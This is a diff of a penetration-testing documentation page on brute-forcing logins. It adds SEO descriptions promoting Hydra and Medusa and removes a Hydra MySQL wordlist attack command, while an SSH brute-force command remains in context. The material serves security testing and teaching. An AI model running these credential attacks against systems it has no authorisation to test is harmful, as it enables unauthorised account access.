@@ -1,9 +1,9 @@
 ---
 title: "Bruteforce"
-description: ""
+description: "Essential bruteforce attack tools and techniques for credential testing. Master Hydra and Medusa to perform parallel login attacks against FTP, SSH, HTTP, MySQL, SMB, and other network services using wordlists and dictionary attacks."
 seo:
-  title: ""
-  description: ""
+  title: "Bruteforce Attack Guide - Hydra & Medusa Password Cracking"
+  description: "Complete bruteforce tutorial using Hydra and Medusa for penetration testing. Learn parallel login attacks against SSH, FTP, HTTP Basic Auth, MySQL, VNC, SMB, and IMAP with practical command examples and optimization techniques."
 ---
 
 ## Hydra
@@ -27,12 +27,6 @@ hydra -L /tmp/wordlists/usernames/http_default_users.txt -P /tmp/wordlists/passw
 
 ```bash
 hydra -l alice -P /tmp/wordlists/passwords/password.txt -u -f ssh://TARGET_IP:PORT -t 4
-```
-
-- MySQL :
-
-```bash
-hydra -L /tmp/wordlists/usernames/multiple_sources_users.txt -P /tmp/wordlists/passwords/password.txt -f mysql://TARGET_IP -V
 ```
 
 - VNC :
